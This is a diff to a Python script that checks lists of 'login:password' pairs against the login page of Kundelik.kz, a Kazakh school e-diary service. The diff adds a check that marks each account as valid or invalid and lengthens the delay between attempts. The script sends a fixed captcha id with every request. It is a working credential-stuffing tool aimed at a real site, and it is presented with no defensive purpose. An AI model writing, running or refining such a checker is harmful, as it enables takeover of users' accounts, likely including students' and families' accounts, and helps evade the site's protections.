@@ -25,19 +25,30 @@ def site_on():
         return False
 
 
-def auth(user_login, user_password):
+def check_auth(text):
+    logged_in = False if ("<title>Kundelik.kz | Kundelik.kz сайтына кіру</title>" in text) else True
+    return logged_in
+
+
+def auth(login, password):
     session = requests.Session()
     url = site_url + 'login'
     params = {
         'exceededAttempts': 'False',
         'ReturnUrl': '',
-        'login': user_login,
-        'password': user_password,
+        'login': login,
+        'password': password,
         'Captcha.Input': '',
         'Captcha.id': '94c0697f-cd7a-4473-b769-c0484656654f'
     }
+    # Send request
     r = session.post(url, params)
-    #print(r.text)
+
+    # Check auth
+    if check_auth(r.text):
+        print('[+]', user_login)
+    else:
+        print('[-]', user_login)
 
 
 while internet_on() and site_on():
@@ -45,16 +56,7 @@ while internet_on() and site_on():
     for line in f.readlines():
         user_login = line.strip().split(':')[0]
         user_password = line.strip().split(':')[1]
-
-        print('[+] Авторизация пользователя:', user_login)
-
         auth(user_login, user_password)
-        time.sleep(3)
+        time.sleep(10)
     print('Все готово')
     break
-
-
-
-
-
-
